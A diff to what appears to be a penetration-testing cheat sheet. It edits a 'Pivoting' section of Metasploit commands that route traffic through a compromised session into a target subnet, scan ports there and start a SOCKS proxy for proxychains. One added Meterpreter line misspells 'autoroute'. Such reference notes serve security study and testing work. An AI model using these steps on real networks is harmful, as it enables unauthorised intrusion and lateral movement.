@@ -226,9 +226,12 @@ c:\> netstat -ano // displays all active connections on victim machine
 _1.4.4 Pivoting_
 ```
 Configure Pivoting Envrionment
-> use post/multi/manage/autoroute // add target subnet and session id
-> route print // check if all traffic destined to that subnet goes through selected session host
-> use auxiliary/scanner/portscan/tcp // try to scan tcp ports in new subnet
+msf> use post/multi/manage/autoroute // add target subnet and session id
+OR
+meterpreter> run auturoute -s TargetSubnet/24
+
+msf> route print // check if all traffic destined to that subnet goes through selected session host
+msf> use auxiliary/scanner/portscan/tcp // try to scan tcp ports in new subnet
 
 > use auxiliary/server/socks4a && run // start a socks4a proxy server
 // edit proxychains conf file, sudo nano /etc/proxychains.conf ; only need to set last line as socks4 127.0.0.1 1080
